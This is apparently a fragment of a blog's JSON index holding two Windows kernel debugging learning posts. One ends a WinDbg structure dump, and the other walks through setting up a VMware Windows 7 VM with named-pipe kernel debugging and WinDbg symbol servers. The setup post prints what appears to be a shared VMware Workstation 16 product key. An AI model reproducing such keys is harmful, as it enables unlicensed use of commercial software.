Ptr32 void +0x150 TlsExpansionBitmap : Ptr32 Void +0x154 TlsExpansionBitmapBits : [32] Uint4B +0x1d4 SessionId : Uint4B +0x1d8 AppCompatFlags : _ULARGE_INTEGER +0x1e0 AppCompatFlagsUser : _ULARGE_INTEGER +0x1e8 pShimData : Ptr32 Void +0x1ec AppCompatInfo : Ptr32 Void +0x1f0 CSDVersion : _UNICODE_STRING +0x1f8 ActivationContextData : Ptr32 _ACTIVATION_CONTEXT_DATA +0x1fc ProcessAssemblyStorageMap : Ptr32 _ASSEMBLY_STORAGE_MAP +0x200 SystemDefaultActivationContextData : Ptr32 _ACTIVATION_CONTEXT_DATA +0x204 SystemAssemblyStorageMap : Ptr32 _ASSEMBLY_STORAGE_MAP +0x208 MinimumStackCommit : Uint4B +0x20c FlsCallback : Ptr32 _FLS_CALLBACK_INFO +0x210 FlsListHead : _LIST_ENTRY +0x218 FlsBitmap : Ptr32 Void +0x21c FlsBitmapBits : [4] Uint4B +0x22c FlsHighIndex : Uint4B +0x230 WerRegistrationData : Ptr32 Void +0x234 WerShipAssertPtr : Ptr32 Void +0x238 pContextData : Ptr32 Void +0x23c pImageHeaderHash : Ptr32 Void +0x240 TracingFlags : Uint4B +0x240 HeapTracingEnabled : Pos 0, 1 Bit +0x240 CritSecTracingEnabled : Pos 1, 1 Bit +0x240 SpareTracingBits : Pos 2, 30 Bits Reference Documentation [1]Infosavvy.Understanding EProcess Structure[J/OL].2020-07-24\n","date":"2020-10-17T20:23:00+08:00","permalink":"https://blog.moeomu.com/posts/windows-kernel-debugging-learning-notes-002-structures/","title":"Windows Kernel Debugging Learning Notes 002 Structures"},{"content":"Source: Moeomu\u0026rsquo;s blog\nDownload Tools Windows 7 SP1 x86 mirror Xunlei download link VMWare Workstation 16 (link below) WinDbg Preview(Microsoft Store) Install Windows Virtual Machine Initially use Windows 7 SP1 x86 as an example to learn\nMSDN download the official image VMWare Workstation 16 to build a virtual environment Download: VMWare 16 Link Key: ZF3R0-FHED2-M80TY-8QYGC-NPKYF Configure the Windows kernel debug virtual machine Remove the printer device from this virtual machine Add serial serial port Click Use named pipe Fill in the string: \\\\.\\pipe\\Windows7x86 (you can fill in the pipeline naming you wish, but you can only modify the Windows7x86 location) Below select that end is the server and the other end is the application In I/O mode, select Active abort when polling The configuration is completed as shown below\nConfigure Windows 7 Enter the command msconfig and click boot as shown below Click on advanced options, enable debugging, baud rate, as shown Configure WinDbg Preview First start the proxy network for unlocking GFW restrictions Set up WinDbg\u0026rsquo;s symbol server and local cache directory SRV*D:\\LocalSymbols*http://msdl.microsoft.com/download/symbols Attach to kernel-COM-check all the checkboxes you can-fill the baud rate-fill the port with \\\\.\\pipe\\Windows7x86 Click OK to debug the virtual machine kernel Set WinDbg\u0026rsquo;s symbol server proxy set _NT_SYMBOL_PROXY=proxy server address:port number ","date":"2020-10-17T19:27:00+08:00","permalink":"https://blog.moeomu.com/posts/windows-kernel-debugging-learning-notes-001-environment-building/","title":"Windows Kernel Debugging Learning Notes 001 Environment Building"}]